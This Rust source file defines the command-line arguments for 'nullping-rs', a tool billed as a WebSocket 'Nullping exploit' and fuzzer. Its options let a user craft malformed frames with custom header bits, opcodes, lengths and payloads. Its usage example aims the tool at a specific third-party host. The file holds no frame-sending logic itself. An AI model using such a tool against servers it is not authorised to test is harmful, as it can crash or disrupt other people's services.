use clap::Parser;

#[derive(Parser, Debug)]
#[command(
    version = "1.0.0",
    author = "Pulsar",
    about = "The first and actual Nullping exploit implementation for WebSocket servers, that actually works for misconfigured servers",
    long_about = "This tool allows you to fuzz WebSocket servers by generating and sending an invalid WebSocket frame, with special bit patterns and payloads.",
    after_help = "Example: \n\
    nullping-rs --address mohmohx.onrender.com \
        --port 443 \
        --protocol wss \
        --use-tungstenite \
        --fin \
        --opcode 9 \
        --len 126 \
        --extended-length 256 \
        --payload $(cat zero_bytes.txt)"
)]
pub(crate) struct Args {
    #[command(flatten)]
    pub server: ServerConfig,
    #[command(flatten)]
    pub bits: Bits,
    #[command(flatten)]
    pub frame: FrameConfig,
}

#[derive(Parser, Debug)]
pub struct Bits {
    #[arg(long, default_value_t = false, help = "FIN bit field")]
    pub fin: bool,

    #[arg(long, default_value_t = false, help = "RSV1 bit field")]
    pub rsv1: bool,

    #[arg(long, default_value_t = false, help = "RSV2 bit field")]
    pub rsv2: bool,

    #[arg(long, default_value_t = false, help = "RSV3 bit field")]
    pub rsv3: bool,

    #[arg(long, default_value_t = false, help = "Mask bit field")]
    pub mask: bool,
}

#[derive(Parser, Debug)]
pub struct ServerConfig {
    #[arg(long, default_value_t = false, help = "Use tungstenite")]
    pub use_tungstenite: bool,

    #[arg(long, default_value_t = String::from("localhost"), help = "Server address")]
    pub address: String,

    #[arg(long, default_value_t = 10000, help = "Server port")]
    pub port: u16,

    #[arg(long, default_value_t = String::from("ws"), help = "Protocol")]
    pub protocol: String,

    #[arg(long,
        default_value_t = String::from("dGhlIHNhbXBsZSBub25jZQ=="),
        help = "Sec-WebSocket-Key header value. A Base64 encoded random string."
    )]
    pub sec_websocket_key: String,

    #[arg(long,
            default_value_t = String::from("/"),
            help = "WebSocket server listen path"
        )]
    pub path: String,
}

#[derive(Parser, Debug)]
pub struct FrameConfig {
    #[arg(long, default_value_t = 0, help = "Opcode field")]
    pub opcode: u8,

    #[arg(long, default_value_t = 0usize, help = "Payload length field")]
    pub len: usize,

    #[arg(
        long,
        default_value_t = 0,
        help = "Extended length depacked. Fill this field if the payload length exceeds 125 bytes, or a crash method requires it"
    )]
    pub extended_length: u64,

    #[arg(long,
        default_values_t = vec![0u8],
        help = "Masking key",
        num_args = 0..,
        value_delimiter = ','
    )]
    pub key: Vec<u8>,

    #[arg(long,
        default_values_t = vec![0u8],
        help = "Payload",
        num_args = 0..,
        value_delimiter = ','
    )]
    pub payload: Vec<u8>,
}
